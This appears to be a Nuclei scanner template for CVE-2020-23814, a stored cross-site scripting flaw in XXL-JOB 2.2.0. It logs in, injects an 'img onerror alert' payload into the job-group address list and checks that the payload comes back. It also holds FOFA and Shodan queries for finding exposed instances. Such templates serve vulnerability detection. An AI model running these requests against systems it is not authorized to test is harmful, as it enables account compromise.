flow: http(1) && http(2) && http(3) && http(4)
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "application/json")
    - contains(body, "\"code\":200")
    internal: true
    type: dsl
  raw:
  - 'POST /xxl-job-admin/login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    Origin: {{RootURL}}

    Referer: {{RootURL}}/xxl-job-admin/toLogin

    X-Requested-With: XMLHttpRequest


    userName={{username}}&password={{password}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "text/html")
    - contains(body, "<b>XXL-JOB</b> 2.2.0")
    internal: true
    type: dsl
  raw:
  - 'GET /xxl-job-admin/ HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "application/json")
    - contains(body, "\"code\":200")
    internal: true
    type: dsl
  raw:
  - 'POST /xxl-job-admin/jobgroup/save HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    Origin: {{RootURL}}

    Referer: {{RootURL}}/xxl-job-admin/jobgroup

    X-Requested-With: XMLHttpRequest


    appname={{title}}&title={{title}}&addressType=1&addressList=<img src=# onerror=\"alert(document.domain)\"
    />

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "application/json")
    - contains_all(body, "{{title}}","alert(document.domain)")
    type: dsl
  raw:
  - 'POST /xxl-job-admin/jobgroup/pageList HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    Origin: {{RootURL}}

    Referer: {{RootURL}}/xxl-job-admin/jobgroup

    X-Requested-With: XMLHttpRequest


    start=0&length=100

    '
id: CVE-2020-23814
info:
  author: Sourabh-Sahu
  classification:
    cpe: cpe:2.3:a:xuxueli:xxl-job:2.2.0:*:*:*:*:*:*:*
    cve-id: CVE-2020-23814
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.82773
    epss-score: 0.01905
  description: 'Multiple cross-site scripting (XSS) vulnerabilities in xxl-job v2.2.0
    allow remote attackers to inject arbitrary web script or HTML via (1) AppName
    and (2)AddressList parameter in JobGroupController.java file.

    '
  impact: 'Authenticated attackers can inject malicious JavaScript through the AppName
    and AddressList parameters, potentially stealing admin session cookies or performing
    administrative actions on behalf of authenticated users.

    '
  metadata:
    fofa-query:
    - app="xxl-job"
    - icon_hash=1691956220
    max-request: 3
    product: xxl-job
    shodan-query:
    - http.html:"/xxl-job-admin/static/favicon.ico"
    - http.favicon.hash:"1691956220"
    vendor: xuxueli
    verified: true
  name: "XXL-JOB v2.2.0 \u2014 Stored Cross Site Scripting"
  reference:
  - https://github.com/xuxueli/xxl-job/issues/1866
  - https://www.ccsq8.com/issues.html
  remediation: 'Upgrade to XXL-JOB version 2.2.1 or later.

    '
  severity: medium
  tags: cve,cve2020,xxl-job,xss,authenticated,vkev,vuln
variables:
  password: '{{password}}'
  title: '{{to_lower(rand_base(6))}}'
  username: '{{username}}'
